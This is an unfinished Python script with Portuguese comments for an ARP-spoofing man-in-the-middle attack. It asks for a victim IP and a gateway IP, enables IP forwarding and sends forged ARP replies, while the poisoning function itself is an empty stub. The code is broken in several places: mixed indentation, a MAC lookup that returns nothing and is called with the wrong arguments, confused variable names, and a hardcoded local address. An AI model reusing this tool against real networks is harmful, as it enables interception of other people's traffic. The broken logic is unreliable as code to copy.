import os,sys
from scapy.all import *
from time import sleep
from threading import Thread as th
from termcolor import colored
inp=colored("[*]",'cyan')
inf=colored("[i]","white")
bom=colored("[+]","green")
mau=colored("[-]","red")
atencao=colored("[!]","yellow")
#while 1:

#print(inp,info,bom,mau,atencao)




def get_input():
    try:
        interface=input(inp+" interface:") #Interface a ser usada
        victimip= input(inp+" Target IP:") #IP de quem vai ser vitima de MITM
        gateip=input(inp+" Gateway IP:") #IP do Gateway
        return [interface,victimip,gateip]
    except KeyboardInterrupt:
        os.system("clear")
        print(info+"Adios")
        sleep(1)
        sys.exit(0)


def MAC(ip,interface):
	conf.verb = 0
    comando="arping -c 1 -i {0} {1} > mac.txt"
	os.system(comando)


def volta(victimip,gateip):
    victimMAC=MAC(victimip)
    gateMAC= MAC(gateip)
    send(ARP(op=2,pdst=gateip,psrc=victimip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc= victimMAC),count=7)
    send(ARP(op=2,pdst= victimip,psrc=gateip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc= gateMAC),count=7)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    sys.exit(1)

#def engana():




if __name__ == "__main__":
    info=get_input()
    print(info)
    gatemac=MAC(inf[2],inf[0])
    victimmac=MAC(inf[1],inf[0])

    localmac=MAC("192.168.100.239")
    print(inf+"A preparar...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    #mac=MAC(info[2],info[0])
    #print(mac)
